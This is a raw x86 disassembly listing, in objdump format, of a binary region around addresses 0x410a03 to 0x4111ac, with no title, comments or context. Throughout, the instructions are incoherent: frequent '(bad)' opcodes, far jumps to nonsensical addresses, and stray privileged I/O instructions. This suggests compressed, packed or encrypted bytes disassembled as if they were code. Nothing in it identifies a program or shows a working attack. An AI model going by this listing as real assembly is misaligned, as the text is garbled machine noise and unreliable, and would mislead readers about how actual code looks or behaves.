  410a03:	cmp    eax,0xe3c5f602
  410a08:	(bad)  
  410a09:	push   DWORD PTR [eax]
  410a0b:	jmp    0xfcc18355
  410a10:	push   cs
  410a11:	imul   DWORD PTR [edi+0x22]
  410a14:	(bad)  
  410a15:	xor    al,BYTE PTR ds:0x14dae82c
  410a1b:	add    al,BYTE PTR [eax]
  410a1d:	(bad)  
  410a1e:	je     0x410a3b
  410a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a21:	outs   dx,DWORD PTR ds:[esi]
  410a22:	sub    eax,DWORD PTR [edx]
  410a24:	mov    eax,eax
  410a26:	inc    edi
  410a27:	cmc    
  410a28:	mov    ch,0xa2
  410a2a:	add    ch,al
  410a2c:	les    esp,FWORD PTR [ebp+0xe3d321]
  410a32:	add    BYTE PTR [eax],al
  410a34:	add    BYTE PTR [eax],al
  410a36:	jmp    0x6967f503
  410a3b:	(bad)  
  410a3c:	pop    edi
  410a3d:	sar    BYTE PTR [esi+0x21],0xbb
  410a41:	or     ebp,esi
  410a43:	dec    esp
  410a44:	xchg   esi,eax
  410a45:	es popa 
  410a47:	repnz cwde 
  410a49:	test   BYTE PTR [eax],0x9
  410a4c:	fisubr WORD PTR [ebp+0x4a]
  410a4f:	jmp    0xfb93:0x1fc2c399
  410a56:	ja     0x410aa1
  410a58:	jmp    0x8eea4b0
  410a5d:	es stos DWORD PTR es:[edi],eax
  410a5f:	mov    WORD PTR [eax],es
  410a61:	test   BYTE PTR [ebx-0x64da0302],ah
  410a67:	xchg   esi,eax
  410a68:	shl    DWORD PTR [esi],cl
  410a6a:	or     BYTE PTR [edx+0x217eafed],dl
  410a70:	sti    
  410a71:	lahf   
  410a72:	push   0x1dcae8c2
  410a77:	xchg   DWORD PTR [eax+0x2e897faf],ebp
  410a7d:	mov    ah,0xf9
  410a7f:	mov    ebp,0xe90cb11b
  410a85:	add    esi,esi
  410a87:	pusha  
  410a88:	push   esp
  410a89:	add    al,0x75
  410a8b:	add    ch,cl
  410a8d:	scas   al,BYTE PTR es:[edi]
  410a8e:	jge    0x410a1b
  410a90:	sub    edi,eax
  410a92:	in     eax,dx
  410a93:	mov    BYTE PTR [esp+eax*1+0x75],bh
  410a97:	add    ah,BYTE PTR [edx+0x3d]
  410a9a:	add    BYTE PTR [eax],al
  410a9c:	add    BYTE PTR [eax],al
  410a9e:	add    BYTE PTR ds:0x7503e2d7,bl
  410aa4:	mov    ebp,DWORD PTR [ebx]
  410aa6:	loopne 0x410b0a
  410aa8:	mov    dl,0x7d
  410aaa:	scas   eax,DWORD PTR es:[edi]
  410aab:	jp     0x410abc
  410aad:	add    BYTE PTR [edi],bh
  410aaf:	adc    BYTE PTR [ecx],ah
  410ab1:	je     0x410a80
  410ab3:	add    DWORD PTR [esi-0x71],edx
  410ab6:	adc    esp,eax
  410ab8:	(bad)  
  410aba:	pop    ebp
  410abb:	retf   0x2f7
  410abe:	ds ret 
  410ac0:	and    BYTE PTR [ecx+edi*8+0x6d],dh
  410ac4:	dec    esp
  410ac5:	(bad)  
  410ac6:	mov    esp,0xf17420ea
  410acb:	jle    0x410acf
  410acd:	loopne 0x410b05
  410acf:	cwde   
  410ad0:	xchg   BYTE PTR [edi+0xa024bde],bh
  410ad6:	jmp    0x1d5a6551
  410adb:	nop
  410adc:	and    al,ch
  410ade:	jae    0x410a6c
  410ae0:	and    dh,bh
  410ae2:	(bad)  
  410ae3:	jmp    0x1f96:0x59993fe3
  410aea:	out    dx,al
  410aeb:	or     BYTE PTR [eax],cl
  410aed:	(bad)  
  410aee:	jl     0x410b6a
  410af0:	movzx  ebx,BYTE PTR [ecx-0x57]
  410af4:	xchg   esp,eax
  410af5:	aas    
  410af6:	jmp    0xea58a154
  410afb:	sub    DWORD PTR [ebp-0x7476a302],esi
  410b01:	retf   0xce
  410b04:	add    BYTE PTR [eax],al
  410b06:	add    BYTE PTR [eax],al
  410b08:	sbb    ecx,DWORD PTR [ebx]
  410b0a:	(bad)  
  410b0b:	cmp    al,0x61
  410b0d:	daa    
  410b0e:	ret    
  410b0f:	sahf   
  410b10:	xchg   ecx,eax
  410b11:	and    BYTE PTR [ecx+ebp*4-0x1f3c79b7],al
  410b18:	jbe    0x410b1c
  410b1a:	mov    eax,0xfe208d02
  410b1f:	nop
  410b20:	xor    ebp,DWORD PTR [esi+edi*8]
  410b23:	xchg   esi,eax
  410b24:	lods   eax,DWORD PTR ds:[esi]
  410b25:	(bad)  
  410b26:	and    ebx,esi
  410b28:	cwde   
  410b29:	mov    eax,0x364c0000
  410b2e:	std    
  410b2f:	jne    0x410b5d
  410b31:	push   ss
  410b32:	mov    ah,0x7
  410b34:	mov    esi,DWORD PTR [eax+0x1a]
  410b37:	cmovb  eax,DWORD PTR [ebx+0x2cc7326]
  410b3e:	push   DWORD PTR [ebp+0x74]
  410b41:	add    edi,eax
  410b43:	push   esi
  410b44:	dec    ebx
  410b45:	jo     0x410b55
  410b47:	add    ebp,DWORD PTR [esi+eiz*8-0x2598f38d]
  410b4e:	std    
  410b4f:	jne    0x410b35
  410b51:	cli    
  410b52:	jg     0x410b33
  410b54:	mov    esp,esi
  410b56:	add    eax,0xffffffab
  410b59:	lahf   
  410b5a:	jg     0x410b65
  410b5c:	int3   
  410b5d:	add    bh,BYTE PTR [eax-0x219a7e5]
  410b63:	and    DWORD PTR [ebx+0x1],0xffffff89
  410b67:	mov    esi,0x318
  410b6c:	add    BYTE PTR [eax],al
  410b6e:	add    BYTE PTR [eax],al
  410b70:	add    BYTE PTR [ebp-0x73fff88b],al
  410b76:	cdq    
  410b77:	inc    ebx
  410b78:	and    al,0xdc
  410b7a:	xor    bh,ch
  410b7c:	jne    0x410b3a
  410b7e:	adc    eax,0x789b07b4
  410b83:	sbb    cl,BYTE PTR [edi]
  410b85:	loop   0x410b1c
  410b87:	es jae 0x410b26
  410b8a:	push   es
  410b8b:	push   DWORD PTR [ebp+0x64]
  410b8e:	add    eax,0x7c3b56d7
  410b93:	push   cs
  410b94:	mov    esp,DWORD PTR [edi]
  410b96:	loop   0x410c0b
  410b98:	or     al,0xb
  410b9a:	jl     0x410ba2
  410b9c:	call   0x3ecce8
  410ba1:	rol    esi,1
  410ba3:	or     eax,0xf5785
  410ba8:	add    BYTE PTR [ebp-0x5e],dh
  410bab:	shr    DWORD PTR [edi-0x13],0x2f
  410baf:	push   ds
  410bb0:	(bad)  
  410bb1:	and    dh,BYTE PTR [ebx+0x34]
  410bb4:	jmp    0x44cfa8d3
  410bb9:	pop    ecx
  410bba:	and    al,0x58
  410bbc:	push   esi
  410bbd:	je     0x410baa
  410bbf:	mov    bl,0xfe
  410bc1:	mov    BYTE PTR [ebx],cl
  410bc3:	adc    esi,DWORD PTR [esi+0x1b98bc72]
  410bc9:	cmp    BYTE PTR [ebp-0x7d],0x27
  410bcd:	imul   ax,WORD PTR [edx],0xffff
  410bd1:	push   0xc70523
  410bd6:	add    BYTE PTR [eax],al
  410bd8:	add    BYTE PTR [eax],al
  410bda:	inc    ebx
  410bdb:	fcomp  QWORD PTR [eax+0x22fb760f]
  410be1:	je     0x410c5c
  410be3:	mov    al,ds:0x1348fe4e
  410be8:	sub    dh,ah
  410bea:	fwait
  410beb:	cld    
  410bec:	and    al,BYTE PTR [ebp+esi*4+0x7df48724]
  410bf3:	sub    eax,DWORD PTR [edx]
  410bf5:	cmp    DWORD PTR [edx+0x257d8b29],0xffffffc3
  410bfc:	add    ah,bh
  410bfe:	xchg   edx,eax
  410bff:	adc    al,0x2b
  410c01:	in     al,0x7d
  410c03:	sub    eax,DWORD PTR [edx]
  410c05:	mov    edi,DWORD PTR [eax]
  410c07:	pinsrw mm1,WORD PTR [edi+0x7a],0xb6
  410c0c:	jecxz  0x410c1c
  410c0e:	sub    ebp,DWORD PTR [ecx+eiz*1]
  410c11:	je     0x410b9c
  410c13:	cmp    al,0x58
  410c15:	(bad)  
  410c16:	(bad)  
  410c17:	fadd   st,st(3)
  410c19:	call   FWORD PTR [ebx-0x2a]
  410c1c:	sti    
  410c1d:	add    ch,BYTE PTR [edx]
  410c1f:	std    
  410c20:	and    dh,BYTE PTR [ebp+eiz*2-0x60]
  410c24:	dec    ebp
  410c25:	dec    al
  410c27:	add    dh,ch
  410c29:	and    al,cl
  410c2b:	or     dl,BYTE PTR [ecx-0x6ae2afab]
  410c31:	mov    dl,ch
  410c33:	or     al,0x64
  410c35:	push   ebp
  410c36:	jp     0x410c3a
  410c38:	jmp    0x7d5f8498
  410c3d:	and    al,BYTE PTR [eax]
  410c3f:	add    BYTE PTR [eax],al
  410c41:	add    BYTE PTR [eax],al
  410c43:	sbb    eax,0xb2282c9
  410c48:	mov    DWORD PTR [ebx],esp
  410c4a:	call   0x4fe60c2
  410c4f:	mov    ch,0xb2
  410c51:	pop    ebp
  410c52:	cwde   
  410c53:	xchg   edx,eax
  410c54:	or     eax,0x96ea0a9f
  410c59:	in     al,dx
  410c5a:	adc    ch,BYTE PTR [ebx]
  410c5c:	adc    BYTE PTR [eax],0x97
  410c5f:	call   0x2e01:0x6a983e02
  410c66:	mov    ecx,0x6d896cb
  410c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c6c:	sbb    al,0x9b
  410c6e:	pmaxsw mm1,QWORD PTR [eax+0x1d]
  410c72:	cwde   
  410c73:	jp     0x410c9f
  410c75:	test   DWORD PTR [ecx-0x55],eax
  410c78:	sbb    al,0x63
  410c7a:	inc    ebx
  410c7b:	jae    0x410c04
  410c7d:	xchg   ebp,eax
  410c7e:	or     esi,DWORD PTR [ebp+0x2]
  410c81:	inc    ecx
  410c82:	add    DWORD PTR [ecx-0x62d40ae4],edx
  410c88:	sbb    ebp,ebp
  410c8a:	and    edi,ebp
  410c8c:	ret    
  410c8d:	hlt    
  410c8e:	inc    edx
  410c8f:	xchg   ebp,eax
  410c90:	push   DWORD PTR [ecx-0x8]
  410c93:	jne    0x410c1e
  410c95:	and    edi,eax
  410c97:	dec    esi
  410c99:	out    0x7,eax
  410c9b:	in     al,dx
  410c9c:	int    0xd4
  410c9e:	lea    ebp,[eax+0x46cf11f2]
  410ca4:	mov    bh,bh
  410ca6:	sbb    eax,DWORD PTR [eax]
  410ca8:	add    BYTE PTR [eax],al
  410caa:	add    BYTE PTR [eax],al
  410cac:	popa   
  410cad:	mov    es,WORD PTR [ebx]
  410caf:	popa   
  410cb0:	lock add ecx,DWORD PTR [ecx-0x7277a6cc]
  410cb7:	gs jns 0x410cbc
  410cba:	add    BYTE PTR [eax+0x3a],ah
  410cbd:	and    al,0x8a
  410cbf:	mov    ds:0x6a67ce10,al
  410cc4:	cli    
  410cc5:	pop    ss
  410cc6:	popa   
  410cc7:	jo     0x410c4a
  410cc9:	xchg   ebp,eax
  410cca:	or     BYTE PTR [esi-0x16fe03ce],ch
  410cd0:	jbe    0x410cd4
  410cd2:	jmp    0x410cc1
  410cd4:	icebp  
  410cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cd6:	pop    ds
  410cd7:	jmp    0xa964d3dd
  410cdc:	inc    esi
  410cde:	and    ecx,DWORD PTR [esi+0xa]
  410ce1:	loopne 0x410cf1
  410ce3:	jg     0x410d51
  410ce5:	sbb    esi,DWORD PTR [ecx+ecx*1+0x64]
  410ce9:	push   esp
  410cea:	pop    DWORD PTR [ecx]
  410cec:	loopne 0x410cc9
  410cee:	jmp    FWORD PTR ds:0x3e02f7ea
  410cf4:	xchg   esp,eax
  410cf5:	xchg   esi,eax
  410cf6:	pop    ss
  410cf7:	jb     0x410d39
  410cf9:	mov    ch,0xfe
  410cfb:	pushf  
  410cfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cfd:	sbb    al,0x74
  410cff:	fst    QWORD PTR [ebp-0x6a]
  410d02:	pop    es
  410d03:	adc    DWORD PTR [edi+0x3e],ecx
  410d06:	(bad)  
  410d07:	(bad)  
  410d08:	sti    
  410d09:	pop    ebx
  410d0a:	jae    0x410cee
  410d0c:	stos   DWORD PTR es:[edi],eax
  410d0d:	std    
  410d0e:	sti    
  410d0f:	out    dx,al
  410d10:	add    BYTE PTR [eax],al
  410d12:	add    BYTE PTR [eax],al
  410d14:	add    BYTE PTR [ebp+0xc],dl
  410d17:	test   esi,eax
  410d19:	ins    DWORD PTR es:[edi],dx
  410d1a:	add    al,BYTE PTR [eax]
  410d1c:	jb     0x410d61
  410d1e:	and    ecx,DWORD PTR [eax-0x1e50d99]
  410d24:	jmp    0x8f61ae
  410d29:	dec    ebp
  410d2a:	repnz mov ch,0x57
  410d2d:	pop    esi
  410d2e:	rcr    bh,0x8
  410d31:	push   edi
  410d32:	int    0x1
  410d34:	stc    
  410d35:	int3   
  410d36:	and    dl,BYTE PTR [edx+0x74]
  410d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d3a:	mov    ss,WORD PTR [esp+ecx*1-0x59]
  410d3e:	dec    esp
  410d3f:	adc    cl,BYTE PTR [ebx+0x3c87f681]
  410d45:	sbb    eax,0xa70c548e
  410d4a:	jl     0x410d36
  410d4c:	mov    DWORD PTR [eax],edx
  410d4e:	adc    BYTE PTR [edx],al
  410d50:	mov    edx,DWORD PTR [edx+0x16]
  410d53:	sub    DWORD PTR [ebp-0x78],ecx
  410d56:	mov    ss,WORD PTR [esp+ecx*1-0x79]
  410d5a:	jl     0x410d52
  410d5c:	mov    DWORD PTR [eax+0x401e3b8c],edx
  410d62:	loop   0x410d61
  410d64:	je     0x410d3b
  410d66:	lea    eax,[ebx+0xc]
  410d69:	mov    DWORD PTR gs:[edx+0x32fedc00],ebx
  410d70:	shl    BYTE PTR ds:0xcc000589,0x8d
  410d77:	inc    ebx
  410d78:	and    al,0x0
  410d7a:	add    BYTE PTR [eax],al
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	or     al,0x4f
  410d80:	std    
  410d81:	jne    0x410d3f
  410d83:	icebp  
  410d84:	mov    ch,0x7
  410d86:	xor    DWORD PTR [edx+ebx*1+0xf],0x4a
  410d8b:	(bad)  
  410d8c:	es jae 0x410d5b
  410d8f:	(bad)  
  410d90:	(bad)  
  410d91:	jne    0x410d27
  410d93:	add    eax,0x748356d7
  410d98:	push   cs
  410d99:	mov    edx,DWORD PTR [edi-0x1e]
  410d9c:	jae    0x410daa
  410d9e:	xchg   ebx,eax
  410d9f:	js     0x410da7
  410da1:	call   0x3ed155
  410da6:	jne    0x410d4e
  410da8:	inc    ebx
  410da9:	push   cs
  410daa:	clc    
  410dab:	fadd   QWORD PTR [esi]
  410dad:	add    BYTE PTR [ebp+0x32],dh
  410db0:	adc    al,0xe7
  410db2:	push   edx
  410db3:	pop    ecx
  410db4:	ficomp DWORD PTR [ebp+edi*2-0x2a]
  410db8:	sti    
  410db9:	cmp    BYTE PTR [ebx+0x7cad98ef],dh
  410dbf:	sar    DWORD PTR [ebx-0x7a6b7c8d],1
  410dc5:	xchg   DWORD PTR [ebp+0x2b],esi
  410dc8:	add    al,BYTE PTR [ebx]
  410dca:	mov    ebx,0x6d44dd03
  410dcf:	pop    ss
  410dd0:	jns    0x410d5c
  410dd2:	mov    eax,0xf5858b3b
  410dd7:	sub    eax,DWORD PTR [edx]
  410dd9:	add    dh,ch
  410ddb:	fimul  WORD PTR [ebx]
  410ddd:	mov    DWORD PTR [ebx+0x44893b],esi
  410de3:	add    BYTE PTR [eax],al
  410de5:	add    BYTE PTR [eax],al
  410de7:	adc    DWORD PTR [edx+0x2b759b85],0xc7388b02
  410df1:	push   ss
  410df2:	xlat   BYTE PTR ds:[ebx]
  410df3:	jle    0x410de0
  410df5:	call   0x1f19df11
  410dfa:	mov    BYTE PTR [ebx],ch
  410dfc:	push   edi
  410dfd:	ret    0x79e8
  410e00:	and    BYTE PTR [edx],al
  410e02:	add    BYTE PTR [esi-0x4e173c15],al
  410e08:	and    DWORD PTR [edx],eax
  410e0a:	add    BYTE PTR [edx-0x47],bh
  410e0d:	mov    BYTE PTR [eax],0x72
  410e10:	mov    cl,0xb6
  410e12:	add    esi,ebp
  410e14:	push   ecx
  410e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e16:	rcl    BYTE PTR [ebp+0x76c20913],0xea
  410e1d:	mov    WORD PTR [ebp+edx*2+0x54],es
  410e21:	inc    ebx
  410e22:	je     0x410e97
  410e24:	add    ch,BYTE PTR [edx-0x58]
  410e27:	inc    esi
  410e28:	add    dl,dl
  410e2a:	repz jnp 0x410e7d
  410e2d:	and    BYTE PTR [ebx],al
  410e2f:	jb     0x410e81
  410e31:	sub    BYTE PTR [eax],cl
  410e33:	xor    al,0x23
  410e35:	lock or bh,BYTE PTR ds:0xff382b8b
  410e3c:	jg     0x410e9a
  410e3e:	add    esi,DWORD PTR [ebp+0x2]
  410e41:	pusha  
  410e42:	enter  0x872a,0x2b
  410e46:	xor    al,0xfd
  410e48:	jg     0x410ebe
  410e4a:	add    eax,DWORD PTR [eax]
  410e4c:	add    BYTE PTR [eax],al
  410e4e:	add    BYTE PTR [eax],al
  410e50:	jne    0x410e54
  410e52:	(bad)  
  410e53:	lds    esi,FWORD PTR [edx-0x7b]
  410e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e57:	add    ch,ah
  410e59:	xchg   esi,eax
  410e5a:	mov    al,ds:0x6922b98c
  410e5f:	sbb    ebp,DWORD PTR [eax-0x67]
  410e62:	loope  0x410df4
  410e64:	icebp  
  410e65:	adc    DWORD PTR [esi+0x1e],ebp
  410e68:	sti    
  410e69:	mov    dh,BYTE PTR [ebx+0x71f5df3f]
  410e6f:	dec    ebx
  410e70:	mov    ch,0x22
  410e72:	jmp    0xdac2:0x25b2891e
  410e79:	mov    DWORD PTR [ebx-0x4cbe06c1],ebp
  410e7f:	push   es
  410e80:	pop    edi
  410e81:	sbb    al,0x3f
  410e83:	mov    BYTE PTR [eax+0x2],bh
  410e86:	jmp    0x27634015
  410e8b:	and    esi,DWORD PTR [edx+esi*4+0x1d]
  410e8f:	xchg   ebp,eax
  410e90:	jle    0x410eab
  410e92:	fwait
  410e93:	aas    
  410e94:	mov    ds:0x5af59cee,eax
  410e99:	add    dh,BYTE PTR [edx-0x38]
  410e9c:	or     BYTE PTR [ebp-0x41021855],0xff
  410ea3:	or     al,0xef
  410ea5:	mov    ebp,0x8576631f
  410eaa:	ret    
  410eab:	cmc    
  410eac:	push   edx
  410ead:	mov    ds:0x20f4de1a,eax
  410eb2:	std    
  410eb3:	push   0x0
  410eb5:	add    BYTE PTR [eax],al
  410eb7:	add    BYTE PTR [eax],al
  410eb9:	mov    eax,0x2a604101
  410ebe:	in     al,0xfe
  410ec0:	cmp    al,0x5d
  410ec2:	or     DWORD PTR [esi-0x70af8757],esi
  410ec8:	add    esp,esp
  410eca:	xlat   BYTE PTR ds:[ebx]
  410ecb:	(bad)  
  410ecc:	jmp    0xa69806d4
  410ed1:	or     bh,ah
  410ed3:	mov    dh,BYTE PTR [edx+0x3f178e88]
  410ed9:	or     BYTE PTR [esi+0xc028e0f],0xff
  410ee0:	cld    
  410ee1:	jle    0x410f0d
  410ee3:	and    ebx,DWORD PTR [ebp+0x2c881868]
  410ee9:	std    
  410eea:	test   bh,dh
  410eec:	call   0xe9d48d5a
  410ef1:	jbe    0x410ef5
  410ef3:	cmp    eax,0xfe189500
  410ef8:	out    0xfa,al
  410efa:	mov    bh,bh
  410efc:	call   0xbe008c77
  410f01:	jns    0x410ed8
  410f03:	sbb    eax,0x7418683d
  410f08:	retf   0xbef3
  410f0b:	iret   
  410f0c:	pusha  
  410f0d:	repz jae 0x410f0f
  410f10:	call   0x9859a8b
  410f15:	ss aaa 
  410f17:	add    DWORD PTR [ecx+0xedb8e81],edi
  410f1d:	add    BYTE PTR [eax],al
  410f1f:	add    BYTE PTR [eax],al
  410f21:	add    BYTE PTR [ebx],al
  410f23:	or     al,0xff
  410f25:	add    BYTE PTR [ecx-0x63bfebb9],dh
  410f2b:	mov    al,BYTE PTR [ebx+0x20]
  410f2e:	fwait
  410f2f:	lods   eax,DWORD PTR ds:[esi]
  410f30:	inc    esi
  410f31:	add    DWORD PTR [ebx+0x1d024ead],ebx
  410f37:	in     al,0x6
  410f39:	or     esp,DWORD PTR [esi]
  410f3b:	add    al,cl
  410f3d:	mov    DWORD PTR [ecx-0x30ff77e2],edx
  410f43:	mov    edi,0x5703c0a
  410f48:	test   BYTE PTR [eax+0xb],bh
  410f4b:	idiv   ch
  410f4d:	mov    edx,DWORD PTR [ecx-0x17b27632]
  410f53:	mov    eax,DWORD PTR [esp+edx*4-0x72fffce4]
  410f5a:	xchg   ecx,eax
  410f5b:	repz cld 
  410f5d:	dec    DWORD PTR [ebx]
  410f5f:	cmp    al,dh
  410f61:	seto   BYTE PTR [edx-0x1b]
  410f65:	(bad)  
  410f66:	sti    
  410f67:	cmc    
  410f68:	adc    edx,DWORD PTR [ebx+edx*8+0x41]
  410f6c:	(bad)  
  410f6d:	call   0x3eecc6
  410f72:	xchg   edi,eax
  410f73:	dec    eax
  410f74:	fimul  DWORD PTR [ebp-0x30c9f]
  410f7a:	dec    ebx
  410f7b:	cmp    al,dh
  410f7d:	je     0x410f51
  410f7f:	cmc    
  410f80:	adc    edx,DWORD PTR [ebx+edx*4+0x42]
  410f84:	dec    BYTE PTR [edx+0x0]
  410f8a:	add    BYTE PTR [ecx],ah
  410f8c:	movntq QWORD PTR [ecx+edx*8+0x118b0002],mm1
  410f94:	ror    DWORD PTR [ecx-0x7b7397b3],cl
  410f9a:	xchg   esp,eax
  410f9b:	pushf  
  410f9c:	add    al,BYTE PTR [eax]
  410f9e:	lea    edx,[ecx]
  410fa0:	repz cld 
  410fa2:	push   DWORD PTR [ebp-0x10]
  410fa5:	xlat   BYTE PTR ds:[ebx]
  410fa6:	(bad)  
  410fa7:	and    DWORD PTR [edi],ebx
  410fa9:	sbb    edx,DWORD PTR [ecx+ebp*1]
  410fac:	call   0xe9890f70
  410fb1:	ret    0x6ee8
  410fb4:	or     BYTE PTR [esi+edi*8],bl
  410fb7:	out    dx,al
  410fb8:	pop    ebp
  410fb9:	out    0x8a,al
  410fbb:	enter  0xc217,0x4f
  410fbf:	push   0xffffffaf
  410fc1:	jecxz  0x410fc1
  410fc3:	call   0x4db528d7
  410fc8:	inc    ebx
  410fc9:	mov    edi,0x8e3d52dd
  410fce:	inc    esp
  410fcf:	gs xchg edx,eax
  410fd1:	cmp    DWORD PTR [edi+0x75],0xb08b022b
  410fd8:	and    ecx,DWORD PTR [ebx-0x3e6d56a3]
  410fde:	outs   dx,DWORD PTR ds:[esi]
  410fdf:	push   ds
  410fe0:	data16 mov es,WORD PTR [ebp+ebx*1+0x33]
  410fe5:	mov    edi,0x36b66a13
  410fea:	in     eax,0x12
  410fec:	jge    0x411008
  410fee:	je     0x410ff0
  410ff0:	add    BYTE PTR [eax],al
  410ff2:	add    BYTE PTR [eax],al
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	nop
  410ff6:	mov    al,0xf3
  410ff8:	add    dl,BYTE PTR [edi]
  410ffa:	adc    cl,BYTE PTR [edx-0x18b15ecd]
  411000:	sub    edx,eax
  411002:	sbb    bh,dh
  411004:	lock jmp 0x411011
  411007:	test   BYTE PTR [edx],ah
  411009:	sub    al,0x2
  41100b:	add    BYTE PTR [esi+0x66],dh
  41100e:	push   cs
  41100f:	(bad)  
  411010:	cmp    BYTE PTR [edi],dh
  411012:	sbb    DWORD PTR [ecx+edx*4+0x31],esi
  411016:	add    bh,bh
  411018:	dec    eax
  411019:	das    
  41101a:	(bad)  
  41101b:	(bad)  
  41101c:	mov    edx,0xbe8afa4e
  411021:	add    bh,BYTE PTR [edi+0x1df2211a]
  411027:	xchg   ecx,eax
  411028:	outs   dx,BYTE PTR ds:[esi]
  411029:	adc    eax,0x268d0b9b
  41102e:	xor    bl,BYTE PTR [ebx]
  411030:	xchg   ebx,eax
  411031:	jg     0x41105b
  411033:	nop
  411034:	les    ebp,FWORD PTR [ebx]
  411036:	adc    DWORD PTR [eax],eax
  411038:	jne    0x41103c
  41103a:	pusha  
  41103b:	mov    ecx,0xef9b8b7e
  411040:	scas   eax,DWORD PTR es:[edi]
  411041:	dec    edx
  411042:	arpl   dx,cx
  411044:	imul   ecx,DWORD PTR [edi+0xec98f00],0xffffffd5
  41104b:	nop
  41104c:	dec    edx
  41104d:	mov    DWORD PTR [esi+0x492a3f8e],esp
  411053:	ds dec ebx
  411055:	adc    eax,0x4363
  41105a:	add    BYTE PTR [eax],al
  41105c:	add    dh,al
  41105e:	bnd jmp 0x2356571c
  411064:	lock (bad) 
  411066:	mov    esi,0x1ab1defc
  41106b:	sbb    al,0x38
  41106d:	pmaddwd mm4,QWORD PTR [ecx-0x37]
  411071:	sahf   
  411072:	jg     0x411013
  411074:	(bad)
  411078:	test   al,0x84
  41107a:	icebp  
  41107b:	sar    DWORD PTR [eax-0x29197386],0xba
  411082:	rcr    DWORD PTR [edi-0x3f],0x4e
  411086:	fnstenv [eax]
  411088:	or     bh,dl
  41108a:	xchg   ecx,eax
  41108b:	inc    ebp
  41108c:	sbb    ah,bl
  41108e:	fdiv   DWORD PTR [ebx+0x14806b17]
  411094:	and    dl,bl
  411096:	adc    al,0x71
  411098:	rcl    BYTE PTR [esi-0x693f903e],0x15
  41109f:	(bad)  
  4110a0:	mov    ebx,0xc3d6879a
  4110a5:	jbe    0x4110bc
  4110a7:	je     0x4110ae
  4110a9:	cli    
  4110aa:	inc    edi
  4110ab:	(bad)  
  4110ac:	xchg   esp,eax
  4110ad:	sahf   
  4110ae:	scas   al,BYTE PTR es:[edi]
  4110af:	(bad)  
  4110b0:	pushf  
  4110b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b2:	adc    esi,DWORD PTR [ebp+ebx*8+0x6f]
  4110b6:	mov    es,WORD PTR [edi]
  4110b8:	adc    esp,edx
  4110ba:	cmp    bh,dh
  4110bc:	inc    BYTE PTR [edx]
  4110be:	push   ebp
  4110bf:	push   cs
  4110c0:	ins    BYTE PTR es:[edi],dx
  4110c1:	add    BYTE PTR [eax],al
  4110c3:	add    BYTE PTR [eax],al
  4110c5:	add    ah,dl
  4110c7:	add    BYTE PTR [eax],al
  4110c9:	jmp    0x2334c831
  4110ce:	and    bl,BYTE PTR [eax]
  4110d0:	jb     0x41108d
  4110d2:	mov    ds,WORD PTR [ecx]
  4110d4:	in     al,0xd6
  4110d6:	jl     0x411060
  4110d8:	dec    ebp
  4110d9:	dec    ebp
  4110da:	ror    BYTE PTR [edx+0xe],cl
  4110dd:	ins    DWORD PTR es:[edi],dx
  4110de:	pushf  
  4110df:	push   ds
  4110e0:	(bad)  
  4110e1:	mov    esi,0xe66bb620
  4110e6:	lock sbb eax,0xd88caee4
  4110ec:	pop    esp
  4110ed:	icebp  
  4110ee:	jge    0x41116c
  4110f0:	fadd   QWORD PTR [esp+edi*2+0x31a93214]
  4110f7:	mov    eax,DWORD PTR [ebp+0x2d]
  4110fa:	xor    BYTE PTR [eax+ebp*8],bh
  4110fd:	test   BYTE PTR [edi+0x14],dl
  411100:	(bad)  
  411101:	jb     0x4110c5
  411103:	or     edi,DWORD PTR [eax]
  411105:	sub    al,0x5
  411107:	add    eax,0x1492a58d
  41110c:	(bad)  
  41110d:	and    ch,BYTE PTR [edi]
  41110f:	test   al,0xe
  411111:	push   0x2d
  411113:	sbb    eax,0x4c6c56fe
  411118:	add    ah,BYTE PTR [edx+0x41]
  41111b:	rcl    cl,1
  41111d:	add    BYTE PTR [edi-0x21],bl
  411120:	add    eax,0x89dc5f42
  411125:	dec    ebp
  411126:	js     0x4110e7
  411128:	out    0x3,al
  41112a:	add    BYTE PTR [eax],al
  41112c:	add    BYTE PTR [eax],al
  41112e:	add    BYTE PTR [esi],dl
  411130:	add    cl,BYTE PTR [eax]
  411132:	inc    ebx
  411133:	sbb    dh,cl
  411135:	or     eax,0xfdf32084
  41113a:	inc    DWORD PTR [ebx-0x1600edad]
  411140:	xor    ebp,DWORD PTR [eax+0x0]
  411143:	jae    0x4110c8
  411145:	sbb    cl,BYTE PTR [ebx+0x1873f96b]
  41114b:	pop    ss
  41114c:	lds    edx,FWORD PTR [edi+edi*8-0x17]
  411150:	paddw  mm6,QWORD PTR [ebp+0x60]
  411154:	cli    
  411155:	jae    0x41115f
  411157:	inc    esp
  411158:	int    0xd7
  41115a:	inc    DWORD PTR [ebx-0x6c]
  41115d:	mov    esi,0xcfe7fb74
  411162:	add    ebx,DWORD PTR [edi+edi*8-0x78]
  411166:	pop    ebp
  411167:	add    BYTE PTR [esi],dh
  411169:	(bad)  
  41116a:	jge    0x4111c8
  41116c:	xor    eax,0x266f6c5c
  411171:	or     eax,0xc6861fb6
  411176:	xor    ebx,esi
  411178:	jge    0x411159
  41117a:	pop    es
  41117b:	dec    esi
  41117c:	int    0xe0
  41117e:	mov    esi,DWORD PTR [ecx-0xe]
  411181:	mov    edi,0x2851fe8
  411186:	or     BYTE PTR [eax+0x4f2872cf],bl
  41118c:	stc    
  41118d:	inc    ebx
  41118e:	adc    al,0x57
  411190:	push   esp
  411191:	adc    bh,BYTE PTR [ebx]
  411193:	add    BYTE PTR [eax],al
  411195:	add    BYTE PTR [eax],al
  411197:	add    BYTE PTR [ecx],bl
  411199:	idiv   DWORD PTR [edx-0x2b]
  41119c:	inc    edi
  41119d:	adc    eax,0x2d754689
  4111a2:	jge    0x411163
  4111a4:	dec    ecx
  4111a5:	sbb    bl,bl
  4111a7:	pop    esp
  4111a8:	jge    0x4111fd
  4111aa:	or     BYTE PTR [ebx],dh
  4111ac:	lods   al,BYTE PTR ds:[esi]
